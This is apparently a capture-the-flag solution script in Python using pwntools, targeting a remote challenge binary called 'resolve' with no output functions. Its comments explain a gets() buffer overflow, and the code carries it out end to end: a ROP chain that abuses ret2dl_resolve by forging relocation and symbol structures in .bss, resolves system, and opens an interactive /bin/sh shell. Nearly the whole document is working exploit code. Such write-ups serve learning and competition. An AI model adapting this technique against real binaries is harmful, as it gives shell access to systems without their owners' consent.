#!/usr/bin/env python

#The much awaited Challenge for me ....This challenge is a normal dyamically linked program but with no functions
#To write into standard output stream.As this challenge reads input from gets it is vulnerable to buffer overflow
#As gets function does not restrict the amount of characters being given as input which leads us to control instruction pointer(rip)
#As this program does not have a output functions to leak memory addresses..
#So it's time to resolve these system function  address by our own.........
#So it's time to ret2dl_resolve my most favourite technique...
#This unusual method exploits the lazy binding method to resolve our own desired symbols like system,execve
#The technique is to make our own fake structs in a user controllable area
#That are used to resolve symbols by pushing a fake large reloc arg
#By returning straight to PLT section where the top of the stack has the reloc arg present ..
#Finding the perfect place for our fake structs and making the correct calculation
#And it is just a matter of seconds to pop our shell


from pwn import *
import time

e = ELF("./resolve")              
r = remote("pwn.utctf.live",5435)     #Handle to communicate with the remote server that runs the binary  
pop_rdi = 0x4011c3                    #Address of pop_rdi gadget              
PLT = 0x401020                        #Address of plt section 
gets_got = 0x404018                   #Address of get .got.plt address which will be the place to keep our system resolved address
reloc_arg = p64(0x280) #The fake reloc arg to resolve the address which after some calculation points to our fake rel struct in .bss
r_info = p64(0x0000028c00000007)      #To pass the assert check and then to point the address of our fake sym struct in .bss
st_name = 0x3cd8                      #The offset from strtab to our function name which is system
payload1 = b'A' * 16                  #Padding to reach ret address in stack 
payload1+=p64(pop_rdi)                #pop_rdi gadget to set .bss address for our input to fall in .bss
payload1+=p64(0x4040b8)               #Address in .bss where our fake rel,sym,system and bin_sh string will be placed
payload1+=p64(0x401040)               #Address of gets plt to make the user controlled read 
payload1+=p64(pop_rdi)                #Pop rdi again to place the address of bin_sh string 
payload1+=p64(0x404100)               #bin_sh string address in .bss
payload1+=p64(0x401159)               #ret instruction to prevent stack alignment failure in Ubuntu 18.04 or higher
payload1+=p64(PLT)                    #returnt to PLT section
payload1+=reloc_arg                   #Our fake reloc arg in stack 
r.sendline(payload1)                  #Send the first payload 
time.sleep(0.2)                       #Time difference to send the second payload
payload2 = p64(gets_got)              #Address of gets got address where our system function resolved address is placed
payload2+=r_info                      #The offset to sym struct after calculation
payload2+=p64(0) * 3                  #One for the padding in rel struct and the other 2 64 bit nulls is for the calulated offset diff
payload2+=p32(st_name)                #The offset to strtab section to system function string
payload2+=p8(0x12)                    #Symbol binding and visibility type
payload2+=p8(0)                       #Below are other required nulls for the forged sym structs
payload2+=p16(0)
payload2+=p64(0)
payload2+=p64(0)
payload2+=b"system\x00\x00"          #Function name string to resolve the function
payload2+=b"/bin/sh\x00"             #/bin/sh string in user controlled area
r.sendline(payload2)                 #Second the second payload to get our awaited shell
r.interactive()                      #Shell out of no memory leak  and syscall gadgets
